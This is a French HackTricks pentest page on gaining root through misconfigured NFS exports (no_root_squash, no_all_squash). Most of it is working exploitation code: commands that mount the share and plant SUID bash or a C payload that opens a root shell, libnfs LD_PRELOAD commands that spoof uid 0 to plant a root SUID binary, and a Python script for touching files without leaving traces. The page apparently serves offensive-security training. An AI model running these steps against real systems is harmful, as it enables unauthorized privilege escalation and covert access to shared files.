<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>


Lisez le fichier _ **/etc/exports** _, si vous trouvez un répertoire configuré comme **no\_root\_squash**, alors vous pouvez **y accéder** en tant que **client** et **écrire à l'intérieur** de ce répertoire **comme si** vous étiez le **root** local de la machine.

**no\_root\_squash**: Cette option donne essentiellement l'autorité à l'utilisateur root sur le client pour accéder aux fichiers sur le serveur NFS en tant que root. Et cela peut entraîner de graves implications en termes de sécurité.

**no\_all\_squash:** C'est similaire à l'option **no\_root\_squash** mais s'applique aux **utilisateurs non root**. Imaginez, vous avez un shell en tant qu'utilisateur nobody ; vérifié le fichier /etc/exports ; l'option no\_all\_squash est présente ; vérifié le fichier /etc/passwd ; émulez un utilisateur non root ; créez un fichier suid en tant qu'utilisateur (en montant en utilisant nfs). Exécutez le suid en tant qu'utilisateur nobody et devenez un utilisateur différent.

# Élévation de privilèges

## Exploitation à distance

Si vous avez trouvé cette vulnérabilité, vous pouvez l'exploiter :

* **Monter ce répertoire** sur une machine cliente, et **en tant que root copier** à l'intérieur du dossier monté le binaire **/bin/bash** et lui donner des droits **SUID**, et **exécuter à partir de la machine victime** ce binaire bash.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **Monter ce répertoire** sur une machine cliente, et **en tant que root copier** à l'intérieur du dossier monté notre charge utile compilée qui exploitera l'autorisation SUID, lui donnera des droits **SUID**, et **exécutera à partir de la machine victime** ce binaire (vous pouvez trouver ici quelques [charges utiles C SUID](payloads-to-execute.md#c)).
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Exploitation Locale

{% hint style="info" %}
Notez que si vous pouvez créer un **tunnel de votre machine vers la machine victime, vous pouvez toujours utiliser la version à distance pour exploiter cette élévation de privilèges en faisant transiter les ports requis**.\
Le tour de passe-passe suivant est en cas de fichier `/etc/exports` **indiquant une adresse IP**. Dans ce cas, vous **ne pourrez pas utiliser** en aucun cas l'**exploit à distance** et vous devrez **abuser de ce tour de passe-passe**.\
Une autre exigence requise pour que l'exploit fonctionne est que **l'exportation à l'intérieur de `/etc/export`** **doit utiliser le drapeau `insecure`**.\
\--_Je ne suis pas sûr que si `/etc/export` indique une adresse IP, ce tour de passe-passe fonctionnera_--
{% endhint %}

## Informations de Base

Le scénario implique l'exploitation d'un partage NFS monté sur une machine locale, en exploitant une faille dans la spécification NFSv3 qui permet au client de spécifier son uid/gid, permettant potentiellement un accès non autorisé. L'exploitation implique l'utilisation de [libnfs](https://github.com/sahlberg/libnfs), une bibliothèque qui permet de forger des appels RPC NFS.

### Compilation de la Bibliothèque

Les étapes de compilation de la bibliothèque peuvent nécessiter des ajustements en fonction de la version du noyau. Dans ce cas spécifique, les appels système fallocate ont été commentés. Le processus de compilation implique les commandes suivantes :
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Réalisation de l'exploit

L'exploit consiste à créer un programme C simple (`pwn.c`) qui élève les privilèges à root puis exécute un shell. Le programme est compilé et le binaire résultant (`a.out`) est placé sur le partage avec suid root, en utilisant `ld_nfs.so` pour falsifier l'uid dans les appels RPC :

1. **Compiler le code de l'exploit :**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Placer l'exploit sur le partage et modifier ses autorisations en falsifiant l'uid :**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Exécuter l'exploit pour obtenir les privilèges root :**
```bash
/mnt/share/a.out
#root
```

## Bonus: NFShell pour un Accès Furtif aux Fichiers
Une fois l'accès root obtenu, pour interagir avec le partage NFS sans changer la propriété (afin d'éviter de laisser des traces), un script Python (nfsh.py) est utilisé. Ce script ajuste l'uid pour correspondre à celui du fichier en cours d'accès, permettant d'interagir avec les fichiers sur le partage sans problèmes de permission :
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Exécutez comme suit :
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
# Références
* [https://www.errno.fr/nfs_privesc.html](https://www.errno.fr/nfs_privesc.html)


<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF** Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.

</details>
